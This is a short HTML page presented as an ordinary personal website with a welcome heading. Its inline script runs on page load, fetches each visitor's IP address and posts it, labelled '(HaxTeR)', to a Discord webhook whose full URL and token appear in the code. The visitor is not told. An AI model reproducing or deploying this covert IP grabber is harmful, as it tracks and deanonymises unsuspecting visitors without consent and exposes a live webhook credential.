<!DOCTYPE html>
<html>
  <head>
    <title>My Website</title>
  </head>
  <body>
    <h1>Welcome to my website!</h1>
    <script>
      function sendIPToDiscord() {
        // Ambil IP pengunjung
        fetch('https://api.ipify.org?format=json')
          .then(response => response.json())
          .then(data => {
            // Kirim IP pengunjung ke Discord menggunakan webhook
            fetch('https://discord.com/api/webhooks/1057150630734594048/6A51DwDlUuvQoGF2xcMjURUz-W6TX9fJ5qKv1h7zvJOMJGm0L4BQoJqx_aQ0l4snR2bO', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                content: `(HaxTeR) IP address: ${data.ip}`
              })
            });
          });
      }

      // Panggil fungsi sendIPToDiscord() saat halaman website dibuka
      sendIPToDiscord();
    </script>
  </body>
</html>
